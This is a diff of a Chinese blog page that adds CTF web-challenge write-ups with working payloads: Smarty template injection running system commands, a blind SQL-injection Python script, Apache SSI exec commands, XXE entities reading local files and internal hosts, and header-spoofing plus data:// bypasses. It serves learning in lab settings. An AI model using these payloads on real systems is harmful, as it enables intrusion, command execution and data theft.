@@ -24,7 +24,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://10vexh.top/null">
 <meta property="article:published_time" content="2022-02-20T15:03:57.000Z">
-<meta property="article:modified_time" content="2022-02-22T16:14:57.423Z">
+<meta property="article:modified_time" content="2022-02-28T16:00:02.507Z">
 <meta property="article:author" content="10vexh">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://10vexh.top/null">
@@ -172,7 +172,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~7.27K
+                        ~15.93K
                     
                     字
                 </li>
@@ -181,7 +181,7 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1645546497423"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1646064002507"></time> 前，其中的内容可能需要更新。
             </div>
             
             <hr />
@@ -252,7 +252,102 @@
 <p>{php}标签，{literal}标签，self方法在该版本已经被弃用了，因此要用**{if}标签**。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">payload：&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">返回：phpinfo的信息</span><br><span class="line"></span><br><span class="line">payload：&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">返回：</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line"></span><br><span class="line">payload：&#123;if system(&#x27;tac /flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">返回：$flag=&quot;flag&#123;d3a12874-3c64-4b3d-9b6f-d0d10822c20e&#125;&quot;</span><br></pre></td></tr></table></figure>
 
-<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2>
+<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>二分法比较快。然后利用亦或判断是否为正确。</p>
+<p><code>1^1=0</code>,<code>1^0=1</code></p>
+<p>直接网上找了现成的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//原地址：https://www.silent666.com/index.php/archives/54/</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">turl=&quot;http://adf67b0a-3f1b-4ac5-bf1d-f19776ddafa7.node4.buuoj.cn:81/search.php&quot;</span><br><span class="line">def try1(i,t):</span><br><span class="line">    #url=turl+&quot;?id=1^(ascii(substr((select(database())),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,t)</span><br><span class="line">    #url=turl+&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,t)</span><br><span class="line">    #url=turl+&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)=(&#x27;Flaaaaag&#x27;))),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,t)</span><br><span class="line">    #url=turl+&quot;?id=1^(ascii(substr((select(group_concat(id,&#x27;~&#x27;,fl4gawsl,&#x27;,&#x27;))from(Flaaaaag)),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,t)</span><br><span class="line">    #url=turl+&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)=(&#x27;F1naI1y&#x27;))),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,t)</span><br><span class="line">    url=turl+&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,t)</span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    if &#x27;NO! Not&#x27; in r.text:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">def half():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(172,220):</span><br><span class="line">        low=32</span><br><span class="line">        high=126</span><br><span class="line">        while low&lt;=high:</span><br><span class="line">            mid=int((high+low)//2)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            if try1(i,mid):</span><br><span class="line">                low=mid+1</span><br><span class="line">            else:</span><br><span class="line">                high=mid-1</span><br><span class="line">        f = int((low + high + 1)) // 2</span><br><span class="line">        flag+=chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line">half()</span><br></pre></td></tr></table></figure>
+
+<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>sql注入没反应后考虑扫后台<code>index.php.swp</code>有东西</p>
+<p>需要我们进行md5碰撞，头相同的密码才可以登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(999999999):</span><br><span class="line">    a = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"></span><br><span class="line">    if a[0:6] == &#x27;6d0bc1&#x27;:</span><br><span class="line">        print(i)</span><br><span class="line">        print(a)</span><br><span class="line">        //输出2020666</span><br></pre></td></tr></table></figure>
+
+<p>登录抓包可以发现隐藏的url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Url_is_here: public/ec121c3639c62491bd26585f2d317fa7fb1ccfd6.shtml</span><br></pre></td></tr></table></figure>
+
+<p>题目出现<code>sthml</code>，存在一个知识点<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1540513">Apache SSI远程命令执行漏洞</a></p>
+<blockquote>
+<p>​       SSI（服务器端包含）是放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估。它们使您可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。</p>
+</blockquote>
+<p>直接执行文章里给的payload，修改后获取信息。</p>
+<p>由于题目的 <code>password</code>是恒定的，因此我们可以把注入点放在<code>username</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：username=&lt;!--#exec cmd=&quot;ls /&quot; --&gt;&amp;password=2020666</span><br><span class="line">返回：Url_is_here: public/75804eedd6cbbd545b4b9c46e3f5dbf952e21186.shtml</span><br><span class="line">访问存在：Hello,bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br></pre></td></tr></table></figure>
+
+<p>好像没有flag,但是经过多番查找发现 存在于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls /var&quot; --&gt;&amp;password=2020666</span><br><span class="line">username=&lt;!--#exec cmd=&quot;ls /var/www&quot; --&gt;&amp;password=2020666</span><br><span class="line">username=&lt;!--#exec cmd=&quot;ls /var/www/html&quot; --&gt;&amp;password=2020666</span><br><span class="line">username=&lt;!--#exec cmd=&quot;tac ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>
+
+<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>​        这题是XXE漏洞。</p>
+<p>​        XXE要先了解XML文档。</p>
+<blockquote>
+<p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
+<ul>
+<li><p>元素：元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;body text in between&lt;/body&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>属性：属性可提供有关元素的额外信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;computer.gif&quot; /&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>实体：实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
+</li>
+<li><p>PCDATA：被解析的字符数据（parsed character data）。</p>
+</li>
+<li><p>CDATA：字符数据（character data）。不会被解析。</p>
+</li>
+</ul>
+</blockquote>
+<p>​    DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
+<p>1，内部声明：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt; </code></p>
+<p><code>ex: &lt;!DOCTYOE test any&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2，外部声明（引用外部DTD）：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; </code></p>
+<p><code>ex:&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">内：</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br><span class="line">note.dtd内容：</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p>1，内部实体声明:<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; </code></p>
+<p><code>ex:&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code><br>完整实例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;test&gt;&amp;writer;&amp;copyright;&lt;/test&gt;</code></p>
+<p><strong>2，外部实体声明:<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></strong><br>完整实例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</code></p>
+<p>XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
+<p>读取文件的base64源码得到账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;php://filter/convert.base64-encode/resource=doLogin.php&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然而没什么用。</p>
+<p>利用etc/hosts找存活的主机也没结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之前学过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp # arp表，可以获得内网其他机器的地址</span><br></pre></td></tr></table></figure>
+
+<p>利用这个获取了内网的ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///proc/net/arp&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用这个获取了flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;http://169.254.1.11&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">//1st</span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];//查询query的字符串</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;//计算&#x27;_&#x27;和&#x27;%5f&#x27;在字符串中出现的次数,如果不等于0返回报错</span><br><span class="line">    die(&#x27;Y0u are So cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;//读入b_u_p_t为23333并且正则匹配</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以利用<code>%20</code>,<code>.</code>来绕过<code>_</code>，利用<code>%0a</code>（换行符的url编码）作为结尾来绕过正则。</p>
+<p>得到了一个<code>secrettw.php</code>文件来访问得到<code>flag</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it?Local access only!</span><br><span class="line">Sorry,you don&#x27;t have permission! Your ip is :sorry,this way is banned! </span><br></pre></td></tr></table></figure>
+
+<p>源码里有个js代码直接利用控制台得到提示<code>post me Merak</code>，传一个<code>Merak=1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#x27;takeip.php&#x27;;</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;Merak&#x27;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = &#x27;&#x27;; </span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">$ip = getIp();</span><br><span class="line">if($ip!=&#x27;127.0.0.1&#x27;)</span><br><span class="line">echo &quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>第一个if:<code>ip</code>不能用<code>xff</code>，用<code>Client-ip=127.0.0.1</code></p>
+<p>第二个if：用data伪协议，<code>2333=data://text/plain,todat is a happy day</code></p>
+<p>得到的然后盲猜<code>file=flag.php</code></p>
+<p>然后有个change函数会改变<code>file</code>传入的东西，我们逆一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$v = &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">function dechange($v) &#123;</span><br><span class="line">	$re = &#x27;&#x27;;</span><br><span class="line">	for ($i = 0; $i &lt; strlen($v); $i++) &#123;</span><br><span class="line">		$re .= chr(ord($v[$i]) - $i * 2);</span><br><span class="line">	&#125;</span><br><span class="line">	return base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line">echo dechange($v);</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>ZmpdYSZmXGI=</code></p>
+<p>完整传参：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span><br><span class="line">Client-ip=127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
         </div>
         
             <div class="kratos-copyright text-center clearfix">
@@ -343,7 +438,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-02-23</span>
+                <span>最后编辑：2022-03-01</span>
                 </div>
             </div>
         </footer>
@@ -414,12 +509,6 @@
         
           
           
-            <a class="list-group-item" href="/2022/02/15/CTFHub-Web-RCE/"><i class="fa  fa-book"></i> CTFHub-Web-RCE</a>
-            
-          
-        
-          
-          
             <a class="list-group-item" href="/2022/02/13/CTFHub-Web-HTTP%E5%8D%8F%E8%AE%AE/"><i class="fa  fa-book"></i> CTFHub-Web-HTTP协议</a>
             
           
@@ -431,7 +520,11 @@
           
         
           
+          
+            <a class="list-group-item" href="/2022/01/03/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fa  fa-book"></i> sql-lab刷题记录</a>
             
+          
+        
           
             
       </ul>
